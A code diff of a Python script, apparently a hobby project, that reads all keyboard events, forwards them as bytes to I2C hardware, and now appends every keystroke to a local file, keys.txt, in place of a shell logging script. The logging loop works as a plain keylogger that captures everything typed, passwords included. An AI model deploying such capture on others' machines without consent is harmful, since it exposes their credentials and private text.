@@ -1,8 +1,8 @@
 import os
 import keyboard
-import subprocess
 from smbus import SMBus
 
+f = open("keys.txt", 'a')
 addr = 0x20 # bus address
 bus = SMBus(1) # indicates /dev/ic2-1
 pathtologSH=f"{os.getcwd()}/log.sh"
@@ -31,8 +31,9 @@ modifiers={
 while True:
     event = keyboard.read_event()
     name=event.name
-    # only record if event is a press down
+    # only record and send if event is a press down
     if event.event_type == keyboard.KEY_DOWN:
+        #Sending
         try:
             # this is to send certain bytes for the modifier keys
             if len(name)>1:
@@ -44,10 +45,10 @@ while True:
         except Exception as e:
             print("failure but still logged")
 
-
+        # Logging
         if name == "space":
-             subprocess.run(["/bin/sh", pathtologSH, " "])
+             f.write(" ")
         elif len(name) > 1:
-            subprocess.run(["/bin/sh", pathtologSH, name.upper()])
+            f.write(name.upper())
         else:
-            subprocess.run(["/bin/sh", pathtologSH, name])
+            f.write(name)
